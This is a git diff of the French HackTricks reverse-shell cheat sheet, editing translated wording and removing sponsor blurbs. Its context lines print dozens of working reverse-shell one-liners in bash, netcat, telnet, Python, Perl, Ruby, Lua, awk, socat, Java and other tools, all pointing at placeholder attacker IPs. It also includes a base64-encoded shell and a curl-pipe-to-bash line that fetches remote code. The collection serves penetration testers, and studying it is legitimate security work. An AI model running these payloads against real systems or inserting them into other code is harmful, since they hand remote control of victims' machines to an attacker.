@@ -4,23 +4,15 @@
 
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-Autres façons de soutenir HackTricks :
+Autres façons de soutenir HackTricks:
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
 
 **Si vous avez des questions sur l'un de ces shells, vous pouvez les vérifier avec** [**https://explainshell.com/**](https://explainshell.com)
 
@@ -41,9 +33,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Coquille sûre de symboles
+### Shell sécurisé par des symboles
 
-N'oubliez pas de vérifier avec d'autres coquilles : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh et bash.
+N'oubliez pas de vérifier avec d'autres shells : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh et bash.
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -55,7 +47,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Explication du Shell
 
 1. **`bash -i`**: Cette partie de la commande démarre un shell Bash interactif (`-i`).
-2. **`>&`**: Cette partie de la commande est une notation abrégée pour **rediriger à la fois la sortie standard** (`stdout`) et **l'erreur standard** (`stderr`) vers la **même destination**.
+2. **`>&`**: Cette partie de la commande est une notation abrégée pour **rediriger à la fois la sortie standard** (`stdout`) et l'**erreur standard** (`stderr`) vers la **même destination**.
 3. **`/dev/tcp/<IP-ATTAQUANT>/<PORT>`**: Il s'agit d'un fichier spécial qui **représente une connexion TCP à l'adresse IP et au port spécifiés**.
 * En **redirigeant les flux de sortie et d'erreur vers ce fichier**, la commande envoie efficacement la sortie de la session shell interactive à la machine de l'attaquant.
 4. **`0>&1`**: Cette partie de la commande **redirige l'entrée standard (`stdin`) vers la même destination que la sortie standard (`stdout`)**.
@@ -77,7 +69,7 @@ Il vous suffit de modifier :
 * Le préfixe et le suffixe de votre charge utile (le cas échéant)
 * La manière dont la charge utile est envoyée (en-têtes ? données ? informations supplémentaires ?)
 
-Ensuite, vous pouvez simplement **envoyer des commandes** ou même **utiliser la commande `upgrade`** pour obtenir un PTY complet (notez que les pipes sont lus et écrits avec un délai approximatif de 1,3 seconde).
+Ensuite, vous pouvez simplement **envoyer des commandes** ou même **utiliser la commande `upgrade`** pour obtenir un shell PTY complet (notez que les pipes sont lus et écrits avec un délai approximatif de 1,3 seconde).
 
 ## Netcat
 ```bash
@@ -95,7 +87,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet est un protocole de communication utilisé pour se connecter à distance à un serveur, souvent pour un débogage ou une administration système. Il transmet les données en texte clair, ce qui le rend vulnérable aux attaques de type interception. Il est recommandé d'éviter d'utiliser Telnet pour des connexions sensibles et de privilégier des protocoles plus sécurisés comme SSH.
+Telnet est un protocole de communication réseau qui permet d'établir une connexion à distance avec un hôte pour accéder à sa ligne de commande. Il est souvent utilisé pour le débogage et la configuration à distance.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -115,8 +107,6 @@ Pour envoyer la commande, écrivez-la, appuyez sur Entrée, puis sur CTRL+D (pou
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
 ## Python
-
-Python is a versatile and powerful programming language commonly used in hacking due to its simplicity and readability. It provides a wide range of libraries and frameworks that can be used for various hacking tasks, such as network scanning, web scraping, and creating custom tools. Python scripts can be easily executed on different operating systems, making it a popular choice among hackers.
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -126,7 +116,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl est un langage de script polyvalent souvent utilisé pour l'automatisation de tâches, le traitement de texte et la manipulation de fichiers. Il est également largement utilisé dans le domaine de la sécurité informatique pour diverses tâches, telles que l'analyse de fichiers journaux, la manipulation de données et la création d'outils personnalisés. Perl offre de puissantes fonctionnalités pour les hackers et les professionnels de la sécurité, en raison de sa flexibilité et de sa capacité à manipuler efficacement les chaînes de caractères et les expressions régulières.
+Perl (Practical Extraction and Reporting Language) est un langage de programmation polyvalent souvent utilisé pour l'automatisation de tâches, le traitement de texte et la manipulation de fichiers. Perl est également largement utilisé dans le domaine du hacking en raison de sa flexibilité et de sa puissance pour effectuer diverses tâches liées à la sécurité informatique.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -137,6 +127,8 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## PHP
+
+PHP (Hypertext Preprocessor) is a widely-used open source general-purpose scripting language that is especially suited for web development and can be embedded into HTML. It is executed on the server side, meaning that the code is processed on the server before being sent to the client's web browser. PHP can perform various tasks such as collecting form data, generating dynamic page content, sending and receiving cookies, and more. It is compatible with many types of databases, making it a versatile tool for web development.
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -159,9 +151,9 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Trouvez las vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des APIs aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
+Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -173,7 +165,7 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 ```
 ## Lua
 
-Lua est un langage de script léger et puissant. Il est souvent utilisé pour l'automatisation de tâches, la création de scripts et le développement d'applications. Lua est largement utilisé dans le domaine des jeux vidéo en raison de sa flexibilité et de sa facilité d'intégration.
+Lua est un langage de script léger et puissant. Il est souvent utilisé pour l'automatisation de tâches, le prototypage rapide et le développement de jeux. Lua est également largement utilisé dans les environnements embarqués en raison de sa taille compacte et de sa facilité d'intégration.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -255,13 +247,13 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
 
-Awk est un langage de programmation polyvalent et une commande de traitement de texte couramment utilisée dans les environnements Unix. Il est souvent utilisé pour extraire et manipuler des données textuelles structurées. Voici un exemple simple d'utilisation d'Awk pour afficher la première colonne d'un fichier CSV :
+Awk est un langage de programmation et une commande de traitement de texte très puissante sous Linux. Il est souvent utilisé pour traiter des fichiers texte en extrayant et en manipulant des données. Voici un exemple simple d'utilisation d'Awk pour afficher la première colonne d'un fichier texte nommé `data.txt` :
 
 ```bash
-awk -F ',' '{print $1}' fichier.csv
+awk '{print $1}' data.txt
 ```
 
-Dans cet exemple, Awk divise chaque ligne du fichier CSV en champs en utilisant la virgule comme délimiteur, puis affiche la première colonne de chaque ligne.
+Dans cet exemple, `'{print $1}'` est le script Awk qui indique à Awk d'imprimer la première colonne de chaque ligne du fichier `data.txt`.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -281,7 +273,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-Gawk est un langage de programmation interprété qui est souvent utilisé pour le traitement de fichiers texte et la génération de rapports. Il est également couramment utilisé par les hackers pour manipuler des données et automatiser des tâches lors de tests d'intrusion. Gawk est particulièrement utile pour extraire des informations spécifiques à partir de fichiers texte volumineux en utilisant des expressions régulières.
+Gawk est un langage de programmation interprété qui est souvent utilisé pour le traitement de fichiers texte et la génération de rapports. Il est également largement utilisé dans les scripts shell pour traiter des données structurées.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -327,18 +319,11 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 ## Références
+
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-
-
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
 
 <details>
 
@@ -348,8 +333,8 @@ Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
